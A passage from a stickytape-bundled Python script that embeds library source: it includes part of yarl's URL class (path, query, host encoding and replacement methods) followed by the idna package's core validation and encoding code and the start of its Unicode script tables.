URL.\r\n\r\n        Empty string if query is missing.\r\n\r\n        """\r\n        return self._val.query\r\n\r\n    @cached_property\r\n    def query_string(self):\r\n        """Decoded query part of URL.\r\n\r\n        Empty string if query is missing.\r\n\r\n        """\r\n        return self._QS_UNQUOTER(self.raw_query_string)\r\n\r\n    @cached_property\r\n    def path_qs(self):\r\n        """Decoded path of URL with query."""\r\n        if not self.query_string:\r\n            return self.path\r\n        return "{}?{}".format(self.path, self.query_string)\r\n\r\n    @cached_property\r\n    def raw_path_qs(self):\r\n        """Encoded path of URL with query."""\r\n        if not self.raw_query_string:\r\n            return self.raw_path\r\n        return "{}?{}".format(self.raw_path, self.raw_query_string)\r\n\r\n    @property\r\n    def raw_fragment(self):\r\n        """Encoded fragment part of URL.\r\n\r\n        Empty string if fragment is missing.\r\n\r\n        """\r\n        return self._val.fragment\r\n\r\n    @cached_property\r\n    def fragment(self):\r\n        """Decoded fragment part of URL.\r\n\r\n        Empty string if fragment is missing.\r\n\r\n        """\r\n        return self._UNQUOTER(self.raw_fragment)\r\n\r\n    @cached_property\r\n    def raw_parts(self):\r\n        """A tuple containing encoded *path* parts.\r\n\r\n        (\'/\',) for absolute URLs if *path* is missing.\r\n\r\n        """\r\n        path = self._val.path\r\n        if self.is_absolute():\r\n            if not path:\r\n                parts = ["/"]\r\n            else:\r\n                parts = ["/"] + path[1:].split("/")\r\n        else:\r\n            if path.startswith("/"):\r\n                parts = ["/"] + path[1:].split("/")\r\n            else:\r\n                parts = path.split("/")\r\n        return tuple(parts)\r\n\r\n    @cached_property\r\n    def parts(self):\r\n        """A tuple containing decoded *path* parts.\r\n\r\n        (\'/\',) for absolute URLs if *path* is missing.\r\n\r\n        """\r\n        return tuple(self._UNQUOTER(part) for part in self.raw_parts)\r\n\r\n    @cached_property\r\n    def parent(self):\r\n        """A new URL with last part of path removed and cleaned up query and\r\n        fragment.\r\n\r\n        """\r\n        path = self.raw_path\r\n        if not path or path == "/":\r\n            if self.raw_fragment or self.raw_query_string:\r\n                return URL(self._val._replace(query="", fragment=""), encoded=True)\r\n            return self\r\n        parts = path.split("/")\r\n        val = self._val._replace(path="/".join(parts[:-1]), query="", fragment="")\r\n        return URL(val, encoded=True)\r\n\r\n    @cached_property\r\n    def raw_name(self):\r\n        """The last part of raw_parts."""\r\n        parts = self.raw_parts\r\n        if self.is_absolute():\r\n            parts = parts[1:]\r\n            if not parts:\r\n                return ""\r\n            else:\r\n                return parts[-1]\r\n        else:\r\n            return parts[-1]\r\n\r\n    @cached_property\r\n    def name(self):\r\n        """The last part of parts."""\r\n        return self._UNQUOTER(self.raw_name)\r\n\r\n    @staticmethod\r\n    def _validate_authority_uri_abs_path(host, path):\r\n        """Ensure that path in URL with authority starts with a leading slash.\r\n\r\n        Raise ValueError if not.\r\n        """\r\n        if len(host) > 0 and len(path) > 0 and not path.startswith("/"):\r\n            raise ValueError(\r\n                "Path in a URL with authority should start with a slash (\'/\') if set"\r\n            )\r\n\r\n    @classmethod\r\n    def _normalize_path(cls, path):\r\n        # Drop \'.\' and \'..\' from path\r\n\r\n        segments = path.split("/")\r\n        resolved_path = []\r\n\r\n        for seg in segments:\r\n            if seg == "..":\r\n                try:\r\n                    resolved_path.pop()\r\n                except IndexError:\r\n                    # ignore any .. segments that would otherwise cause an\r\n                    # IndexError when popped from resolved_path if\r\n                    # resolving for rfc3986\r\n                    pass\r\n            elif seg == ".":\r\n                continue\r\n            else:\r\n                resolved_path.append(seg)\r\n\r\n        if segments[-1] in (".", ".."):\r\n            # do some post-processing here.\r\n            # if the last segment was a relative dir,\r\n            # then we need to append the trailing \'/\'\r\n            resolved_path.append("")\r\n\r\n        return "/".join(resolved_path)\r\n\r\n    if sys.version_info >= (3, 7):\r\n\r\n        @classmethod\r\n        def _encode_host(cls, host, human=False):\r\n            try:\r\n                ip, sep, zone = host.partition("%")\r\n                ip = ip_address(ip)\r\n            except ValueError:\r\n                host = host.lower()\r\n                # IDNA encoding is slow,\r\n                # skip it for ASCII-only strings\r\n                # Don\'t move the check into _idna_encode() helper\r\n                # to reduce the cache size\r\n                if human or host.isascii():\r\n                    return host\r\n                host = _idna_encode(host)\r\n            else:\r\n                host = ip.compressed\r\n                if sep:\r\n                    host += "%" + zone\r\n                if ip.version == 6:\r\n                    host = "[" + host + "]"\r\n            return host\r\n\r\n    else:\r\n        # work around for missing str.isascii() in Python <= 3.6\r\n        @classmethod\r\n        def _encode_host(cls, host, human=False):\r\n            try:\r\n                ip, sep, zone = host.partition("%")\r\n                ip = ip_address(ip)\r\n            except ValueError:\r\n                host = host.lower()\r\n                if human:\r\n                    return host\r\n\r\n                for char in host:\r\n                    if char > "\\x7f":\r\n                        break\r\n                else:\r\n                    return host\r\n                host = _idna_encode(host)\r\n            else:\r\n                host = ip.compressed\r\n                if sep:\r\n                    host += "%" + zone\r\n                if ip.version == 6:\r\n                    host = "[" + host + "]"\r\n            return host\r\n\r\n    @classmethod\r\n    def _make_netloc(\r\n        cls, user, password, host, port, encode=False, encode_host=True, requote=False\r\n    ):\r\n        quoter = cls._REQUOTER if requote else cls._QUOTER\r\n        if encode_host:\r\n            ret = cls._encode_host(host)\r\n        else:\r\n            ret = host\r\n        if port:\r\n            ret = ret + ":" + str(port)\r\n        if password is not None:\r\n            if not user:\r\n                user = ""\r\n            else:\r\n                if encode:\r\n                    user = quoter(user)\r\n            if encode:\r\n                password = quoter(password)\r\n            user = user + ":" + password\r\n        elif user and encode:\r\n            user = quoter(user)\r\n        if user:\r\n            ret = user + "@" + ret\r\n        return ret\r\n\r\n    def with_scheme(self, scheme):\r\n        """Return a new URL with scheme replaced."""\r\n        # N.B. doesn\'t cleanup query/fragment\r\n        if not isinstance(scheme, str):\r\n            raise TypeError("Invalid scheme type")\r\n        if not self.is_absolute():\r\n            raise ValueError("scheme replacement is not allowed for relative URLs")\r\n        return URL(self._val._replace(scheme=scheme.lower()), encoded=True)\r\n\r\n    def with_user(self, user):\r\n        """Return a new URL with user replaced.\r\n\r\n        Autoencode user if needed.\r\n\r\n        Clear user/password if user is None.\r\n\r\n        """\r\n        # N.B. doesn\'t cleanup query/fragment\r\n        val = self._val\r\n        if user is None:\r\n            password = None\r\n        elif isinstance(user, str):\r\n            user = self._QUOTER(user)\r\n            password = val.password\r\n        else:\r\n            raise TypeError("Invalid user type")\r\n        if not self.is_absolute():\r\n            raise ValueError("user replacement is not allowed for relative URLs")\r\n        return URL(\r\n            self._val._replace(\r\n                netloc=self._make_netloc(user, password, val.hostname, val.port)\r\n            ),\r\n            encoded=True,\r\n        )\r\n\r\n    def with_password(self, password):\r\n        """Return a new URL with password replaced.\r\n\r\n        Autoencode password if needed.\r\n\r\n        Clear password if argument is None.\r\n\r\n        """\r\n        # N.B. doesn\'t cleanup query/fragment\r\n        if password is None:\r\n            pass\r\n        elif isinstance(password, str):\r\n            password = self._QUOTER(password)\r\n        else:\r\n            raise TypeError("Invalid password type")\r\n        if not self.is_absolute():\r\n            raise ValueError("password replacement is not allowed for relative URLs")\r\n        val = self._val\r\n        return URL(\r\n            self._val._replace(\r\n                netloc=self._make_netloc(val.username, password, val.hostname, val.port)\r\n            ),\r\n            encoded=True,\r\n        )\r\n\r\n    def with_host(self, host):\r\n        """Return a new URL with host replaced.\r\n\r\n        Autoencode host if needed.\r\n\r\n        Changing host for relative URLs is not allowed, use .join()\r\n        instead.\r\n\r\n        """\r\n        # N.B. doesn\'t cleanup query/fragment\r\n        if not isinstance(host, str):\r\n            raise TypeError("Invalid host type")\r\n        if not self.is_absolute():\r\n            raise ValueError("host replacement is not allowed for relative URLs")\r\n        if not host:\r\n            raise ValueError("host removing is not allowed")\r\n        val = self._val\r\n        return URL(\r\n            self._val._replace(\r\n                netloc=self._make_netloc(val.username, val.password, host, val.port)\r\n            ),\r\n            encoded=True,\r\n        )\r\n\r\n    def with_port(self, port):\r\n        """Return a new URL with port replaced.\r\n\r\n        Clear port to default if None is passed.\r\n\r\n        """\r\n        # N.B. doesn\'t cleanup query/fragment\r\n        if port is not None and not isinstance(port, int):\r\n            raise TypeError("port should be int or None, got {}".format(type(port)))\r\n        if not self.is_absolute():\r\n            raise ValueError("port replacement is not allowed for relative URLs")\r\n        val = self._val\r\n        return URL(\r\n            self._val._replace(\r\n                netloc=self._make_netloc(val.username, val.password, val.hostname, port)\r\n            ),\r\n            encoded=True,\r\n        )\r\n\r\n    def with_path(self, path, *, encoded=False):\r\n        """Return a new URL with path replaced."""\r\n        if not encoded:\r\n            path = self._PATH_QUOTER(path)\r\n            if self.is_absolute():\r\n                path = self._normalize_path(path)\r\n        if len(path) > 0 and path[0] != "/":\r\n            path = "/" + path\r\n        return URL(self._val._replace(path=path, query="", fragment=""), encoded=True)\r\n\r\n    @classmethod\r\n    def _query_seq_pairs(cls, quoter, pairs):\r\n        for key, val in pairs:\r\n            if isinstance(val, (list, tuple)):\r\n                for v in val:\r\n                    yield quoter(key) + "=" + quoter(cls._query_var(v))\r\n            else:\r\n                yield quoter(key) + "=" + quoter(cls._query_var(val))\r\n\r\n    @staticmethod\r\n    def _query_var(v):\r\n        cls = type(v)\r\n        if issubclass(cls, str):\r\n            return v\r\n        if issubclass(cls, float):\r\n            if math.isinf(v):\r\n                raise ValueError("float(\'inf\') is not supported")\r\n            if math.isnan(v):\r\n                raise ValueError("float(\'nan\') is not supported")\r\n            return str(float(v))\r\n        if issubclass(cls, int) and cls is not bool:\r\n            return str(int(v))\r\n        raise TypeError(\r\n            "Invalid variable type: value "\r\n            "should be str, int or float, got {!r} "\r\n            "of type {}".format(v, cls)\r\n        )\r\n\r\n    def _get_str_query(self, *args, **kwargs):\r\n        if kwargs:\r\n            if len(args) > 0:\r\n                raise ValueError(\r\n                    "Either kwargs or single query parameter must be present"\r\n                )\r\n            query = kwargs\r\n        elif len(args) == 1:\r\n            query = args[0]\r\n        else:\r\n            raise ValueError("Either kwargs or single query parameter must be present")\r\n\r\n        if query is None:\r\n            query = ""\r\n        elif isinstance(query, Mapping):\r\n            quoter = self._QUERY_PART_QUOTER\r\n            query = "&".join(self._query_seq_pairs(quoter, query.items()))\r\n        elif isinstance(query, str):\r\n            query = self._QUERY_QUOTER(query)\r\n        elif isinstance(query, (bytes, bytearray, memoryview)):\r\n            raise TypeError(\r\n                "Invalid query type: bytes, bytearray and memoryview are forbidden"\r\n            )\r\n        elif isinstance(query, Sequence):\r\n            quoter = self._QUERY_PART_QUOTER\r\n            # We don\'t expect sequence values if we\'re given a list of pairs\r\n            # already; only mappings like builtin `dict` which can\'t have the\r\n            # same key pointing to multiple values are allowed to use\r\n            # `_query_seq_pairs`.\r\n            query = "&".join(\r\n                quoter(k) + "=" + quoter(self._query_var(v)) for k, v in query\r\n            )\r\n        else:\r\n            raise TypeError(\r\n                "Invalid query type: only str, mapping or "\r\n                "sequence of (key, value) pairs is allowed"\r\n            )\r\n\r\n        return query\r\n\r\n    def with_query(self, *args, **kwargs):\r\n        """Return a new URL with query part replaced.\r\n\r\n        Accepts any Mapping (e.g. dict, multidict.MultiDict instances)\r\n        or str, autoencode the argument if needed.\r\n\r\n        A sequence of (key, value) pairs is supported as well.\r\n\r\n        It also can take an arbitrary number of keyword arguments.\r\n\r\n        Clear query if None is passed.\r\n\r\n        """\r\n        # N.B. doesn\'t cleanup query/fragment\r\n\r\n        new_query = self._get_str_query(*args, **kwargs)\r\n        return URL(\r\n            self._val._replace(path=self._val.path, query=new_query), encoded=True\r\n        )\r\n\r\n    def update_query(self, *args, **kwargs):\r\n        """Return a new URL with query part updated."""\r\n        s = self._get_str_query(*args, **kwargs)\r\n        new_query = MultiDict(parse_qsl(s, keep_blank_values=True))\r\n        query = MultiDict(self.query)\r\n        query.update(new_query)\r\n\r\n        return URL(self._val._replace(query=self._get_str_query(query)), encoded=True)\r\n\r\n    def with_fragment(self, fragment):\r\n        """Return a new URL with fragment replaced.\r\n\r\n        Autoencode fragment if needed.\r\n\r\n        Clear fragment to default if None is passed.\r\n\r\n        """\r\n        # N.B. doesn\'t cleanup query/fragment\r\n        if fragment is None:\r\n            raw_fragment = ""\r\n        elif not isinstance(fragment, str):\r\n            raise TypeError("Invalid fragment type")\r\n        else:\r\n            raw_fragment = self._FRAGMENT_QUOTER(fragment)\r\n        if self.raw_fragment == raw_fragment:\r\n            return self\r\n        return URL(self._val._replace(fragment=raw_fragment), encoded=True)\r\n\r\n    def with_name(self, name):\r\n        """Return a new URL with name (last part of path) replaced.\r\n\r\n        Query and fragment parts are cleaned up.\r\n\r\n        Name is encoded if needed.\r\n\r\n        """\r\n        # N.B. DOES cleanup query/fragment\r\n        if not isinstance(name, str):\r\n            raise TypeError("Invalid name type")\r\n        if "/" in name:\r\n            raise ValueError("Slash in name is not allowed")\r\n        name = self._PATH_QUOTER(name)\r\n        if name in (".", ".."):\r\n            raise ValueError(". and .. values are forbidden")\r\n        parts = list(self.raw_parts)\r\n        if self.is_absolute():\r\n            if len(parts) == 1:\r\n                parts.append(name)\r\n            else:\r\n                parts[-1] = name\r\n            parts[0] = ""  # replace leading \'/\'\r\n        else:\r\n            parts[-1] = name\r\n            if parts[0] == "/":\r\n                parts[0] = ""  # replace leading \'/\'\r\n        return URL(\r\n            self._val._replace(path="/".join(parts), query="", fragment=""),\r\n            encoded=True,\r\n        )\r\n\r\n    def join(self, url):\r\n        """Join URLs\r\n\r\n        Construct a full (\xe2\x80\x9cabsolute\xe2\x80\x9d) URL by combining a \xe2\x80\x9cbase URL\xe2\x80\x9d\r\n        (self) with another URL (url).\r\n\r\n        Informally, this uses components of the base URL, in\r\n        particular the addressing scheme, the network location and\r\n        (part of) the path, to provide missing components in the\r\n        relative URL.\r\n\r\n        """\r\n        # See docs for urllib.parse.urljoin\r\n        if not isinstance(url, URL):\r\n            raise TypeError("url should be URL")\r\n        return URL(urljoin(str(self), str(url)), encoded=True)\r\n\r\n    def human_repr(self):\r\n        """Return decoded human readable string for URL representation."""\r\n        user = _human_quote(self.user, "#/:?@")\r\n        password = _human_quote(self.password, "#/:?@")\r\n        host = self.host\r\n        if host:\r\n            host = self._encode_host(self.host, human=True)\r\n        path = _human_quote(self.path, "#?")\r\n        query_string = "&".join(\r\n            "{}={}".format(_human_quote(k, "#&+;="), _human_quote(v, "#&+;="))\r\n            for k, v in self.query.items()\r\n        )\r\n        fragment = _human_quote(self.fragment, "")\r\n        return urlunsplit(\r\n            SplitResult(\r\n                self.scheme,\r\n                self._make_netloc(\r\n                    user,\r\n                    password,\r\n                    host,\r\n                    self._val.port,\r\n                    encode_host=False,\r\n                ),\r\n                path,\r\n                query_string,\r\n                fragment,\r\n            )\r\n        )\r\n\r\n\r\ndef _human_quote(s, unsafe):\r\n    if not s:\r\n        return s\r\n    for c in "%" + unsafe:\r\n        if c in s:\r\n            s = s.replace(c, "%{:02X}".format(ord(c)))\r\n    if s.isprintable():\r\n        return s\r\n    return "".join(c if c.isprintable() else quote(c) for c in s)\r\n\r\n\r\n_MAXCACHE = 256\r\n\r\n\r\n@functools.lru_cache(_MAXCACHE)\r\ndef _idna_decode(raw):\r\n    try:\r\n        return idna.decode(raw.encode("ascii"))\r\n    except UnicodeError:  # e.g. \'::1\'\r\n        return raw.encode("ascii").decode("idna")\r\n\r\n\r\n@functools.lru_cache(_MAXCACHE)\r\ndef _idna_encode(host):\r\n    try:\r\n        return idna.encode(host, uts46=True).decode("ascii")\r\n    except UnicodeError:\r\n        return host.encode("idna").decode("ascii")\r\n\r\n\r\n@rewrite_module\r\ndef cache_clear():\r\n    _idna_decode.cache_clear()\r\n    _idna_encode.cache_clear()\r\n\r\n\r\n@rewrite_module\r\ndef cache_info():\r\n    return {\r\n        "idna_encode": _idna_encode.cache_info(),\r\n        "idna_decode": _idna_decode.cache_info(),\r\n    }\r\n\r\n\r\n@rewrite_module\r\ndef cache_configure(*, idna_encode_size=_MAXCACHE, idna_decode_size=_MAXCACHE):\r\n    global _idna_decode, _idna_encode\r\n\r\n    _idna_encode = functools.lru_cache(idna_encode_size)(_idna_encode.__wrapped__)\r\n    _idna_decode = functools.lru_cache(idna_decode_size)(_idna_decode.__wrapped__)\r\n')
    __stickytape_write_module('idna/__init__.py', b'from .package_data import __version__\nfrom .core import (\n    IDNABidiError,\n    IDNAError,\n    InvalidCodepoint,\n    InvalidCodepointContext,\n    alabel,\n    check_bidi,\n    check_hyphen_ok,\n    check_initial_combiner,\n    check_label,\n    check_nfc,\n    decode,\n    encode,\n    ulabel,\n    uts46_remap,\n    valid_contextj,\n    valid_contexto,\n    valid_label_length,\n    valid_string_length,\n)\nfrom .intranges import intranges_contain\n\n__all__ = [\n    "IDNABidiError",\n    "IDNAError",\n    "InvalidCodepoint",\n    "InvalidCodepointContext",\n    "alabel",\n    "check_bidi",\n    "check_hyphen_ok",\n    "check_initial_combiner",\n    "check_label",\n    "check_nfc",\n    "decode",\n    "encode",\n    "intranges_contain",\n    "ulabel",\n    "uts46_remap",\n    "valid_contextj",\n    "valid_contexto",\n    "valid_label_length",\n    "valid_string_length",\n]\n')
    __stickytape_write_module('idna/package_data.py', b"__version__ = '3.3'\n\n")
    __stickytape_write_module('idna/core.py', b'from . import idnadata\nimport bisect\nimport unicodedata\nimport re\nfrom typing import Union, Optional\nfrom .intranges import intranges_contain\n\n_virama_combining_class = 9\n_alabel_prefix = b\'xn--\'\n_unicode_dots_re = re.compile(\'[\\u002e\\u3002\\uff0e\\uff61]\')\n\nclass IDNAError(UnicodeError):\n    """ Base exception for all IDNA-encoding related problems """\n    pass\n\n\nclass IDNABidiError(IDNAError):\n    """ Exception when bidirectional requirements are not satisfied """\n    pass\n\n\nclass InvalidCodepoint(IDNAError):\n    """ Exception when a disallowed or unallocated codepoint is used """\n    pass\n\n\nclass InvalidCodepointContext(IDNAError):\n    """ Exception when the codepoint is not valid in the context it is used """\n    pass\n\n\ndef _combining_class(cp: int) -> int:\n    v = unicodedata.combining(chr(cp))\n    if v == 0:\n        if not unicodedata.name(chr(cp)):\n            raise ValueError(\'Unknown character in unicodedata\')\n    return v\n\ndef _is_script(cp: str, script: str) -> bool:\n    return intranges_contain(ord(cp), idnadata.scripts[script])\n\ndef _punycode(s: str) -> bytes:\n    return s.encode(\'punycode\')\n\ndef _unot(s: int) -> str:\n    return \'U+{:04X}\'.format(s)\n\n\ndef valid_label_length(label: Union[bytes, str]) -> bool:\n    if len(label) > 63:\n        return False\n    return True\n\n\ndef valid_string_length(label: Union[bytes, str], trailing_dot: bool) -> bool:\n    if len(label) > (254 if trailing_dot else 253):\n        return False\n    return True\n\n\ndef check_bidi(label: str, check_ltr: bool = False) -> bool:\n    # Bidi rules should only be applied if string contains RTL characters\n    bidi_label = False\n    for (idx, cp) in enumerate(label, 1):\n        direction = unicodedata.bidirectional(cp)\n        if direction == \'\':\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError(\'Unknown directionality in label {} at position {}\'.format(repr(label), idx))\n        if direction in [\'R\', \'AL\', \'AN\']:\n            bidi_label = True\n    if not bidi_label and not check_ltr:\n        return True\n\n    # Bidi rule 1\n    direction = unicodedata.bidirectional(label[0])\n    if direction in [\'R\', \'AL\']:\n        rtl = True\n    elif direction == \'L\':\n        rtl = False\n    else:\n        raise IDNABidiError(\'First codepoint in label {} must be directionality L, R or AL\'.format(repr(label)))\n\n    valid_ending = False\n    number_type = None  # type: Optional[str]\n    for (idx, cp) in enumerate(label, 1):\n        direction = unicodedata.bidirectional(cp)\n\n        if rtl:\n            # Bidi rule 2\n            if not direction in [\'R\', \'AL\', \'AN\', \'EN\', \'ES\', \'CS\', \'ET\', \'ON\', \'BN\', \'NSM\']:\n                raise IDNABidiError(\'Invalid direction for codepoint at position {} in a right-to-left label\'.format(idx))\n            # Bidi rule 3\n            if direction in [\'R\', \'AL\', \'EN\', \'AN\']:\n                valid_ending = True\n            elif direction != \'NSM\':\n                valid_ending = False\n            # Bidi rule 4\n            if direction in [\'AN\', \'EN\']:\n                if not number_type:\n                    number_type = direction\n                else:\n                    if number_type != direction:\n                        raise IDNABidiError(\'Can not mix numeral types in a right-to-left label\')\n        else:\n            # Bidi rule 5\n            if not direction in [\'L\', \'EN\', \'ES\', \'CS\', \'ET\', \'ON\', \'BN\', \'NSM\']:\n                raise IDNABidiError(\'Invalid direction for codepoint at position {} in a left-to-right label\'.format(idx))\n            # Bidi rule 6\n            if direction in [\'L\', \'EN\']:\n                valid_ending = True\n            elif direction != \'NSM\':\n                valid_ending = False\n\n    if not valid_ending:\n        raise IDNABidiError(\'Label ends with illegal codepoint directionality\')\n\n    return True\n\n\ndef check_initial_combiner(label: str) -> bool:\n    if unicodedata.category(label[0])[0] == \'M\':\n        raise IDNAError(\'Label begins with an illegal combining character\')\n    return True\n\n\ndef check_hyphen_ok(label: str) -> bool:\n    if label[2:4] == \'--\':\n        raise IDNAError(\'Label has disallowed hyphens in 3rd and 4th position\')\n    if label[0] == \'-\' or label[-1] == \'-\':\n        raise IDNAError(\'Label must not start or end with a hyphen\')\n    return True\n\n\ndef check_nfc(label: str) -> None:\n    if unicodedata.normalize(\'NFC\', label) != label:\n        raise IDNAError(\'Label must be in Normalization Form C\')\n\n\ndef valid_contextj(label: str, pos: int) -> bool:\n    cp_value = ord(label[pos])\n\n    if cp_value == 0x200c:\n\n        if pos > 0:\n            if _combining_class(ord(label[pos - 1])) == _virama_combining_class:\n                return True\n\n        ok = False\n        for i in range(pos-1, -1, -1):\n            joining_type = idnadata.joining_types.get(ord(label[i]))\n            if joining_type == ord(\'T\'):\n                continue\n            if joining_type in [ord(\'L\'), ord(\'D\')]:\n                ok = True\n                break\n\n        if not ok:\n            return False\n\n        ok = False\n        for i in range(pos+1, len(label)):\n            joining_type = idnadata.joining_types.get(ord(label[i]))\n            if joining_type == ord(\'T\'):\n                continue\n            if joining_type in [ord(\'R\'), ord(\'D\')]:\n                ok = True\n                break\n        return ok\n\n    if cp_value == 0x200d:\n\n        if pos > 0:\n            if _combining_class(ord(label[pos - 1])) == _virama_combining_class:\n                return True\n        return False\n\n    else:\n\n        return False\n\n\ndef valid_contexto(label: str, pos: int, exception: bool = False) -> bool:\n    cp_value = ord(label[pos])\n\n    if cp_value == 0x00b7:\n        if 0 < pos < len(label)-1:\n            if ord(label[pos - 1]) == 0x006c and ord(label[pos + 1]) == 0x006c:\n                return True\n        return False\n\n    elif cp_value == 0x0375:\n        if pos < len(label)-1 and len(label) > 1:\n            return _is_script(label[pos + 1], \'Greek\')\n        return False\n\n    elif cp_value == 0x05f3 or cp_value == 0x05f4:\n        if pos > 0:\n            return _is_script(label[pos - 1], \'Hebrew\')\n        return False\n\n    elif cp_value == 0x30fb:\n        for cp in label:\n            if cp == \'\\u30fb\':\n                continue\n            if _is_script(cp, \'Hiragana\') or _is_script(cp, \'Katakana\') or _is_script(cp, \'Han\'):\n                return True\n        return False\n\n    elif 0x660 <= cp_value <= 0x669:\n        for cp in label:\n            if 0x6f0 <= ord(cp) <= 0x06f9:\n                return False\n        return True\n\n    elif 0x6f0 <= cp_value <= 0x6f9:\n        for cp in label:\n            if 0x660 <= ord(cp) <= 0x0669:\n                return False\n        return True\n\n    return False\n\n\ndef check_label(label: Union[str, bytes, bytearray]) -> None:\n    if isinstance(label, (bytes, bytearray)):\n        label = label.decode(\'utf-8\')\n    if len(label) == 0:\n        raise IDNAError(\'Empty Label\')\n\n    check_nfc(label)\n    check_hyphen_ok(label)\n    check_initial_combiner(label)\n\n    for (pos, cp) in enumerate(label):\n        cp_value = ord(cp)\n        if intranges_contain(cp_value, idnadata.codepoint_classes[\'PVALID\']):\n            continue\n        elif intranges_contain(cp_value, idnadata.codepoint_classes[\'CONTEXTJ\']):\n            try:\n                if not valid_contextj(label, pos):\n                    raise InvalidCodepointContext(\'Joiner {} not allowed at position {} in {}\'.format(\n                        _unot(cp_value), pos+1, repr(label)))\n            except ValueError:\n                raise IDNAError(\'Unknown codepoint adjacent to joiner {} at position {} in {}\'.format(\n                    _unot(cp_value), pos+1, repr(label)))\n        elif intranges_contain(cp_value, idnadata.codepoint_classes[\'CONTEXTO\']):\n            if not valid_contexto(label, pos):\n                raise InvalidCodepointContext(\'Codepoint {} not allowed at position {} in {}\'.format(_unot(cp_value), pos+1, repr(label)))\n        else:\n            raise InvalidCodepoint(\'Codepoint {} at position {} of {} not allowed\'.format(_unot(cp_value), pos+1, repr(label)))\n\n    check_bidi(label)\n\n\ndef alabel(label: str) -> bytes:\n    try:\n        label_bytes = label.encode(\'ascii\')\n        ulabel(label_bytes)\n        if not valid_label_length(label_bytes):\n            raise IDNAError(\'Label too long\')\n        return label_bytes\n    except UnicodeEncodeError:\n        pass\n\n    if not label:\n        raise IDNAError(\'No Input\')\n\n    label = str(label)\n    check_label(label)\n    label_bytes = _punycode(label)\n    label_bytes = _alabel_prefix + label_bytes\n\n    if not valid_label_length(label_bytes):\n        raise IDNAError(\'Label too long\')\n\n    return label_bytes\n\n\ndef ulabel(label: Union[str, bytes, bytearray]) -> str:\n    if not isinstance(label, (bytes, bytearray)):\n        try:\n            label_bytes = label.encode(\'ascii\')\n        except UnicodeEncodeError:\n            check_label(label)\n            return label\n    else:\n        label_bytes = label\n\n    label_bytes = label_bytes.lower()\n    if label_bytes.startswith(_alabel_prefix):\n        label_bytes = label_bytes[len(_alabel_prefix):]\n        if not label_bytes:\n            raise IDNAError(\'Malformed A-label, no Punycode eligible content found\')\n        if label_bytes.decode(\'ascii\')[-1] == \'-\':\n            raise IDNAError(\'A-label must not end with a hyphen\')\n    else:\n        check_label(label_bytes)\n        return label_bytes.decode(\'ascii\')\n\n    try:\n        label = label_bytes.decode(\'punycode\')\n    except UnicodeError:\n        raise IDNAError(\'Invalid A-label\')\n    check_label(label)\n    return label\n\n\ndef uts46_remap(domain: str, std3_rules: bool = True, transitional: bool = False) -> str:\n    """Re-map the characters in the string according to UTS46 processing."""\n    from .uts46data import uts46data\n    output = \'\'\n\n    for pos, char in enumerate(domain):\n        code_point = ord(char)\n        try:\n            uts46row = uts46data[code_point if code_point < 256 else\n                bisect.bisect_left(uts46data, (code_point, \'Z\')) - 1]\n            status = uts46row[1]\n            replacement = None  # type: Optional[str]\n            if len(uts46row) == 3:\n                replacement = uts46row[2]  # type: ignore\n            if (status == \'V\' or\n                    (status == \'D\' and not transitional) or\n                    (status == \'3\' and not std3_rules and replacement is None)):\n                output += char\n            elif replacement is not None and (status == \'M\' or\n                    (status == \'3\' and not std3_rules) or\n                    (status == \'D\' and transitional)):\n                output += replacement\n            elif status != \'I\':\n                raise IndexError()\n        except IndexError:\n            raise InvalidCodepoint(\n                \'Codepoint {} not allowed at position {} in {}\'.format(\n                _unot(code_point), pos + 1, repr(domain)))\n\n    return unicodedata.normalize(\'NFC\', output)\n\n\ndef encode(s: Union[str, bytes, bytearray], strict: bool = False, uts46: bool = False, std3_rules: bool = False, transitional: bool = False) -> bytes:\n    if isinstance(s, (bytes, bytearray)):\n        s = s.decode(\'ascii\')\n    if uts46:\n        s = uts46_remap(s, std3_rules, transitional)\n    trailing_dot = False\n    result = []\n    if strict:\n        labels = s.split(\'.\')\n    else:\n        labels = _unicode_dots_re.split(s)\n    if not labels or labels == [\'\']:\n        raise IDNAError(\'Empty domain\')\n    if labels[-1] == \'\':\n        del labels[-1]\n        trailing_dot = True\n    for label in labels:\n        s = alabel(label)\n        if s:\n            result.append(s)\n        else:\n            raise IDNAError(\'Empty label\')\n    if trailing_dot:\n        result.append(b\'\')\n    s = b\'.\'.join(result)\n    if not valid_string_length(s, trailing_dot):\n        raise IDNAError(\'Domain too long\')\n    return s\n\n\ndef decode(s: Union[str, bytes, bytearray], strict: bool = False, uts46: bool = False, std3_rules: bool = False) -> str:\n    try:\n        if isinstance(s, (bytes, bytearray)):\n            s = s.decode(\'ascii\')\n    except UnicodeDecodeError:\n        raise IDNAError(\'Invalid ASCII in A-label\')\n    if uts46:\n        s = uts46_remap(s, std3_rules, False)\n    trailing_dot = False\n    result = []\n    if not strict:\n        labels = _unicode_dots_re.split(s)\n    else:\n        labels = s.split(\'.\')\n    if not labels or labels == [\'\']:\n        raise IDNAError(\'Empty domain\')\n    if not labels[-1]:\n        del labels[-1]\n        trailing_dot = True\n    for label in labels:\n        s = ulabel(label)\n        if s:\n            result.append(s)\n        else:\n            raise IDNAError(\'Empty label\')\n    if trailing_dot:\n        result.append(\'\')\n    return \'.\'.join(result)\n')
    __stickytape_write_module('idna/idnadata.py', b"# This file is automatically generated by tools/idna-data\n\n__version__ = '14.0.0'\nscripts = {\n    'Greek': (\n        0x37000000374,\n        0x37500000378,\n        0x37a0000037e,\n        0x37f00000380,\n        0x38400000385,\n        0x38600000387,\n        0x3880000038b,\n        0x38c0000038d,\n        0x38e000003a2,\n        0x3a3000003e2,\n        0x3f000000400,\n        0x1d2600001d2b,\n        0x1d5d00001d62,\n        0x1d6600001d6b,\n        0x1dbf00001dc0,\n        0x1f0000001f16,\n        0x1f1800001f1e,\n        0x1f2000001f46,\n        0x1f4800001f4e,\n        0x1f5000001f58,\n        0x1f5900001f5a,\n        0x1f5b00001f5c,\n        0x1f5d00001f5e,\n        0x1f5f00001f7e,\n        0x1f8000001fb5,\n        0x1fb600001fc5,\n        0x1fc600001fd4,\n        0x1fd600001fdc,\n        0x1fdd00001ff0,\n        0x1ff200001ff5,\n        0x1ff600001fff,\n        0x212600002127,\n        0xab650000ab66,\n        0x101400001018f,\n        0x101a0000101a1,\n        0x1d2000001d246,\n    ),\n    'Han': (\n        0x2e8000002e9a,\n        0x2e9b00002ef4,\n        0x2f0000002fd6,\n        0x300500003006,\n        0x300700003008,\n        0x30210000302a,\n        0x30380000303c,\n        0x340000004dc0,\n        0x4e000000a000,\n        0xf9000000fa6e,\n        0xfa700000fada,\n        